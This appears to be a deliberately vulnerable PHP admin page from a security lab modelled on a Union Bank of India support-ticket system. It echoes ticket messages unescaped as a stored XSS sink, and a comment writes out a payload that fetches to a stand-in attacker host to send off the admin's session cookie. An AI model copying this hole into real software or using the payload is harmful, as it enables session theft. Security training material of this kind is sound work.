<?php
// ================================================================
//  Union Bank of India – Admin: Support Ticket Management
//  VULNERABLE XSS TRIGGER – ticket message echoed WITHOUT htmlspecialchars()
//  Attack Scenario #4: Attacker submits XSS payload via support.php
//  When admin views this page, JS executes, stealing session cookie
// ================================================================
require_once '/var/www/html/config/database.php';
require_once '/var/www/html/includes/auth.php';
$session    = check_auth(['admin', 'banker']);
$page_title = 'Support Tickets – Admin';

$db = getDB();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ticket_id'])) {
    $tid = (int)$_POST['ticket_id'];
    $db->prepare("UPDATE support_tickets SET status = 'resolved' WHERE id = ?")->execute([$tid]);
    header('Location: /admin/tickets.php?resolved=1');
    exit;
}

$resolved      = isset($_GET['resolved']);
$status_filter = $_GET['status'] ?? 'all';

$query = "SELECT t.*, u.full_name, u.email FROM support_tickets t LEFT JOIN users u ON t.user_id = u.id";
if ($status_filter === 'open')     $query .= " WHERE t.status = 'open'";
elseif ($status_filter === 'resolved') $query .= " WHERE t.status = 'resolved'";
$query .= " ORDER BY t.created_at DESC";

$tickets       = $db->query($query)->fetchAll();
$open_count    = $db->query("SELECT COUNT(*) FROM support_tickets WHERE status='open'")->fetchColumn();
$resolved_count= $db->query("SELECT COUNT(*) FROM support_tickets WHERE status='resolved'")->fetchColumn();

include '/var/www/html/includes/header.php';
?>

<div class="page-header">
    <h2>🎫 Support Ticket Management</h2>
    <p class="breadcrumb"><a href="/admin/index.php">Admin Panel</a> › Support Tickets</p>
</div>

<!-- Admin tab nav -->
<div class="admin-tabs">
    <a href="/admin/index.php">📊 Dashboard</a>
    <a href="/admin/users.php">👥 Users</a>
    <a href="/admin/tickets.php" class="active">🎫 Support Tickets</a>
    <a href="/dashboard.php">← Main Dashboard</a>
</div>

<?php if ($resolved): ?><div class="alert alert-success">✅ Ticket resolved successfully.</div><?php endif; ?>

<!-- Stats -->
<div class="stats-grid" style="grid-template-columns:repeat(3,1fr);margin-bottom:20px;">
    <div class="stat-card">
        <div class="stat-icon red">🎫</div>
        <div><span class="stat-value"><?php echo $open_count; ?></span><span class="stat-label">Open Tickets</span></div>
    </div>
    <div class="stat-card">
        <div class="stat-icon green">✅</div>
        <div><span class="stat-value"><?php echo $resolved_count; ?></span><span class="stat-label">Resolved</span></div>
    </div>
    <div class="stat-card">
        <div class="stat-icon blue">📋</div>
        <div><span class="stat-value"><?php echo $open_count + $resolved_count; ?></span><span class="stat-label">Total</span></div>
    </div>
</div>

<!-- Filter buttons -->
<div style="display:flex;gap:8px;margin-bottom:18px;">
    <a href="/admin/tickets.php" class="btn btn-sm <?php echo $status_filter==='all'?'btn-primary':'btn-outline'; ?>">All</a>
    <a href="/admin/tickets.php?status=open" class="btn btn-sm <?php echo $status_filter==='open'?'btn-primary':'btn-outline'; ?>">Open</a>
    <a href="/admin/tickets.php?status=resolved" class="btn btn-sm <?php echo $status_filter==='resolved'?'btn-primary':'btn-outline'; ?>">Resolved</a>
</div>

<!-- Ticket list -->
<?php if (empty($tickets)): ?>
<div class="card"><div class="empty-state card-body"><div class="icon">📋</div><p>No tickets found.</p></div></div>
<?php endif; ?>

<?php foreach ($tickets as $tk): ?>
<div class="card">
    <div class="ticket-head">
        <div>
            <strong style="color:var(--primary);">SR<?php echo $tk['id']; ?></strong>
            &nbsp;—&nbsp;
            <strong><?php echo htmlspecialchars($tk['subject'], ENT_QUOTES); ?></strong>
            &nbsp;
            <span class="badge <?php echo $tk['status']==='open'?'badge-warning':'badge-success'; ?>"><?php echo strtoupper($tk['status']); ?></span>
        </div>
        <div class="ticket-meta">
            <?php echo htmlspecialchars($tk['full_name'] ?? $tk['username'] ?? 'Anonymous', ENT_QUOTES); ?>
            <?php if ($tk['email']): ?>&nbsp;|&nbsp;<?php echo htmlspecialchars($tk['email'], ENT_QUOTES); ?><?php endif; ?>
            &nbsp;|&nbsp;<?php echo date('d M Y, h:i A', strtotime($tk['created_at'])); ?>
        </div>
    </div>
    <div class="ticket-body">
        <!--
            !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            VULNERABLE XSS SINK — message echoed RAW, no sanitisation
            Stored XSS payload from support.php executes HERE
            Payload: <script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>
            !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        -->
        <?php echo $tk['message']; ?>

        <?php if ($tk['status'] === 'open'): ?>
        <hr style="border:none;border-top:1px solid var(--border);margin:14px 0;">
        <form method="POST" style="margin:0;">
            <input type="hidden" name="ticket_id" value="<?php echo $tk['id']; ?>">
            <button type="submit" class="btn btn-success btn-sm">✅ Mark Resolved</button>
        </form>
        <?php endif; ?>
    </div>
</div>
<?php endforeach; ?>

<?php include '/var/www/html/includes/footer.php'; ?>
